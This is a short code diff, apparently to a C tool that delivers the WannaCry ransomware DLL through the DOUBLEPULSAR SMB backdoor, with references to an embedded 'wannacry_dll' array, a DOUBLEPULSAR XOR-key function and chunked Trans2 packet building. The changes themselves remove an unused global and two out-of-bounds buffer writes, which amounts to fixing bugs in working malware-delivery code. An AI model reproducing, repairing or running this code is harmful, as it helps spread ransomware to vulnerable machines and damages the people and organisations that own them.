@@ -5453,7 +5453,6 @@ unsigned char wannacry_dll[] =
 
 //globals
 unsigned char recvbuff[4096];
-HANDLE hProcHeap;
 
 unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
 {
@@ -5772,7 +5771,7 @@ int main(int argc, char* argv[])
 				break;
 			}
 			memset(big_packet, 0x00, 4178);
-			big_packet[4179] = '\0';
+
 			//copy the trans2 request to big_packet
 			memcpy(big_packet, (char*)wannacry_Trans2_Request, 70);
 
@@ -5826,7 +5825,6 @@ int main(int argc, char* argv[])
 	{
 			printf("Bytes left is less than 4096!...This will be the last & smaller packet!\n");
 			memset(big_packet, 0x00, 4178);
-			big_packet[4179] = '\0';
 
 			//copy trans2 header to big packet
 			memcpy(big_packet, wannacry_Trans2_Request, 70);
